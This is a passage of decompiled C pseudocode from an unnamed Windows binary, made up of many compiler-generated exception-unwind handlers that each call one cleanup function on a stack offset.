  return;
}



void Unwind_003c4b47(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x214));
  return;
}



void Unwind_003c4b52(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x188));
  return;
}



void Unwind_003c4b5d(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x16c));
  return;
}



void Unwind_003c4b68(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x150));
  return;
}



void Unwind_003c4b73(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x134));
  return;
}



void Unwind_003c4b7e(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1a4));
  return;
}



void Unwind_003c4b89(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1dc));
  return;
}



void Unwind_003c4b94(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1f8));
  return;
}



void Unwind_003c4b9f(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1c0));
  return;
}



void Unwind_003c4baa(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x230));
  return;
}



void Unwind_003c4bb5(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x214));
  return;
}



void Unwind_003c4bc0(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x24c));
  return;
}



void Unwind_003c4bcb(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x16c));
  return;
}



void Unwind_003c4bd6(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x150));
  return;
}



void Unwind_003c4be1(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x134));
  return;
}



void Unwind_003c4bec(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1a4));
  return;
}



void Unwind_003c4bf7(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1dc));
  return;
}



void Unwind_003c4c02(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1f8));
  return;
}



void Unwind_003c4c0d(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1c0));
  return;
}



void Unwind_003c4c18(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x230));
  return;
}



void Unwind_003c4c23(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x214));
  return;
}



void Unwind_003c4c2e(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x188));
  return;
}



void Unwind_003c4c39(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x150));
  return;
}



void Unwind_003c4c44(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x134));
  return;
}



void Unwind_003c4c4f(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1a4));
  return;
}



void Unwind_003c4c5a(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1dc));
  return;
}



void Unwind_003c4c65(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1f8));
  return;
}



void Unwind_003c4c70(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1c0));
  return;
}



void Unwind_003c4c7b(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x230));
  return;
}



void Unwind_003c4c86(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x214));
  return;
}



void Unwind_003c4c91(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x24c));
  return;
}



void Unwind_003c4c9c(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x16c));
  return;
}



void Unwind_003c4ca7(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x150));
  return;
}



void Unwind_003c4cb2(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x134));
  return;
}



void Unwind_003c4cbd(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1a4));
  return;
}



void Unwind_003c4cc8(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1dc));
  return;
}



void Unwind_003c4cd3(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1f8));
  return;
}



void Unwind_003c4cde(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1c0));
  return;
}



void Unwind_003c4ce9(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x230));
  return;
}



void Unwind_003c4cf4(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x214));
  return;
}



void Unwind_003c4cff(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x24c));
  return;
}



void Unwind_003c4d0a(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x188));
  return;
}



void Unwind_003c4d15(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x150));
  return;
}



void Unwind_003c4d20(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x134));
  return;
}



void Unwind_003c4d2b(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1a4));
  return;
}



void Unwind_003c4d36(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1dc));
  return;
}



void Unwind_003c4d41(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1f8));
  return;
}



void Unwind_003c4d4c(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1c0));
  return;
}



void Unwind_003c4d57(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x230));
  return;
}



void Unwind_003c4d62(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x214));
  return;
}



void Unwind_003c4d6d(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x24c));
  return;
}



void Unwind_003c4d78(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x16c));
  return;
}



void Unwind_003c4d83(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1a4));
  return;
}



void Unwind_003c4d8e(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1dc));
  return;
}



void Unwind_003c4d99(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1f8));
  return;
}



void Unwind_003c4da4(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1c0));
  return;
}



void Unwind_003c4daf(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x230));
  return;
}



void Unwind_003c4dba(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x214));
  return;
}



void Unwind_003c4dc5(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x24c));
  return;
}



void Unwind_003c4dd0(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x134));
  return;
}



void Unwind_003c4ddb(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1a4));
  return;
}



void Unwind_003c4de6(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1dc));
  return;
}



void Unwind_003c4df1(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1f8));
  return;
}



void Unwind_003c4dfc(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1c0));
  return;
}



void Unwind_003c4e07(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x230));
  return;
}



void Unwind_003c4e12(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x214));
  return;
}



void Unwind_003c4e1d(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x24c));
  return;
}



void Unwind_003c4e28(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x150));
  return;
}



void Unwind_003c4e33(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1a4));
  return;
}



void Unwind_003c4e3e(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1dc));
  return;
}



void Unwind_003c4e49(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1f8));
  return;
}



void Unwind_003c4e54(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1c0));
  return;
}



void Unwind_003c4e5f(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x230));
  return;
}



void Unwind_003c4e6a(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x214));
  return;
}



void Unwind_003c4e75(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x24c));
  return;
}



void Unwind_003c4e80(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x2d8));
  return;
}



void Unwind_003c4e8b(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x32c));
  return;
}



void Unwind_003c4e96(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x2f4));
  return;
}



void Unwind_003c4ea1(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -700));
  return;
}



void Unwind_003c4eac(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x2a0));
  return;
}



void Unwind_003c4eb7(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x268));
  return;
}



void Unwind_003c4ec2(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x284));
  return;
}



void Unwind_003c4ecd(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x310));
  return;
}



void Unwind_003c4f00(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x548));
  return;
}



void Unwind_003c4f0b(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x544));
  return;
}



void Unwind_003c4f16(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x544));
  return;
}



void Unwind_003c4f21(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x548));
  return;
}



void Unwind_003c4f2c(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x544));
  return;
}



void Unwind_003c4f37(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x548));
  return;
}



void Unwind_003c4f42(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x544));
  return;
}



void Unwind_003c4f4d(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x548));
  return;
}



void Unwind_003c4f58(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x544));
  return;
}



void Unwind_003c4f63(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x548));
  return;
}



void Unwind_003c4f6e(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x544));
  return;
}



void Unwind_003c4f79(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x548));
  return;
}



void Unwind_003c4f84(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x544));
  return;
}



void Unwind_003c4f8f(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x548));
  return;
}



void Unwind_003c4f9a(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x544));
  return;
}



void Unwind_003c4fa5(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x548));
  return;
}



void Unwind_003c4fb0(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x544));
  return;
}



void Unwind_003c4fbb(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x548));
  return;
}



void Unwind_003c4fc6(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x544));
  return;
}



void Unwind_003c4fd1(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x548));
  return;
}



void Unwind_003c4fdc(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x544));
  return;
}



void Unwind_003c4fe7(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x548));
  return;
}



void Unwind_003c4ff2(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x544));
  return;
}



void Unwind_003c4ffd(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x548));
  return;
}



void Unwind_003c5008(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x544));
  return;
}



void Unwind_003c5013(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x548));
  return;
}



void Unwind_003c501e(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x544));
  return;
}



void Unwind_003c5029(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x548));
  return;
}



void Unwind_003c5034(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x544));
  return;
}



void Unwind_003c503f(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x548));
  return;
}



void Unwind_003c504a(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x544));
  return;
}



void Unwind_003c5055(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x548));
  return;
}



void Unwind_003c5060(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x544));
  return;
}



void Unwind_003c506b(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x548));
  return;
}



void Unwind_003c5076(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x544));
  return;
}



void Unwind_003c5081(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x548));
  return;
}



void Unwind_003c508c(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x544));
  return;
}



void Unwind_003c5097(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x548));
  return;
}



void Unwind_003c50d0(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x48));
  return;
}



void Unwind_003c50d8(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x2c));
  return;
}



void Unwind_003c50e0(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x2c));
  return;
}



void Unwind_003c50e8(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x2c));
  return;
}



void Unwind_003c50f0(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x2c));
  return;
}



void Unwind_003c50f8(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x2c));
  return;
}



void Unwind_003c5100(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x2c));
  return;
}



void Unwind_003c5130(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1524));
  return;
}



void Unwind_003c513b(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x155c));
  return;
}



void Unwind_003c5146(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1540));
  return;
}



void Unwind_003c5180(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x730));
  return;
}



void Unwind_003c51c0(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x624));
  return;
}



void Unwind_003c5200(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x18dcc));
  return;
}



void Unwind_003c520b(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x18de8));
  return;
}



void Unwind_003c5216(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x18dcc));
  return;
}



void Unwind_003c5221(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x18de8));
  return;
}



void Unwind_003c522c(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x18dcc));
  return;
}



void Unwind_003c5237(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x18de8));
  return;
}



void Unwind_003c5242(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x18e04));
  return;
}



void Unwind_003c524d(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x18e20));
  return;
}



void Unwind_003c5280(void)

{
  int unaff_EBP;
  
  if (0xf < *(uint *)(unaff_EBP + -0x80c)) {
    FUN_003aee4b(*(void **)(unaff_EBP + -0x820));
  }
  *(undefined4 *)(unaff_EBP + -0x80c) = 0xf;
  *(undefined4 *)(unaff_EBP + -0x810) = 0;
  *(undefined *)(void **)(unaff_EBP + -0x820) = 0;
  return;
}



void Unwind_003c528b(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x8c8));
  return;
}



void Unwind_003c5296(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x8c8));
  return;
}



void Unwind_003c52a1(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x7fc));
  return;
}



void Unwind_003c52ac(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x7fc));
  return;
}



void Unwind_003c52b7(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x83c));
  return;
}



void Unwind_003c52c2(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x874));
  return;
}



void Unwind_003c52cd(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x858));
  return;
}



void Unwind_003c52d8(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x8e4));
  return;
}



void Unwind_003c52e3(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x8ac));
  return;
}



void Unwind_003c52ee(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x7fc));
  return;
}



void Unwind_003c52f9(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x890));
  return;
}



void Unwind_003c5304(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x858));
  return;
}



void Unwind_003c530f(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x874));
  return;
}



void Unwind_003c531a(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x83c));
  return;
}



void Unwind_003c5325(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x8c8));
  return;
}



void Unwind_003c5330(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x900));
  return;
}



void Unwind_003c533b(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x8ac));
  return;
}



void Unwind_003c5346(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x8e4));
  return;
}


